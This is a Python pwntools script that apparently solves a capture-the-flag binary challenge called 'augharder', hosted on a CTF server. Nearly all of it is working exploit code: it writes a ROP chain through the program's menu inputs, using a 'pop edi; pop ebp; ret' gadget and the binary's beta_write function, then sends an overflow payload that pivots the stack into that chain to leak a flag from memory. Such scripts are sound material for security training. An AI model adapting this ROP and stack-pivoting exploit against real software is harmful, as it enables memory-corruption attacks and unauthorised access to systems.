from pwn import *

context.binary = elf = ELF('./augharder')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('augharder.challs.olicyber.it', 10607)
elif args.GDB:
    r = gdb.debug('./augharder', gdbscript='''
              b *main+203
              b *main+208
              c
              ''')
else:
    r = process('./augharder')

FLAG_ADDRESS = 0x804B060

# rop chain
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b':', str(elf.sym['beta_write']).encode())
r.sendlineafter(b':', str(0x08048caa).encode()) # pop edi; pop ebp; ret;
r.sendlineafter(b':', str(FLAG_ADDRESS).encode())
r.sendlineafter(b':', str(40).encode())
for i in range(6):
    r.sendlineafter(b':', str(0).encode())
    

r.sendlineafter(b'> ', b'5')

# stack pivoting
payload = flat({30: [
    0x0804B0A4, # lista film + 4 (dove si trova la rop chain + 4 perchè fa pop ecx; lea esp, [ecx - 4])
]})
r.sendlineafter(b': ', payload)

r.interactive()
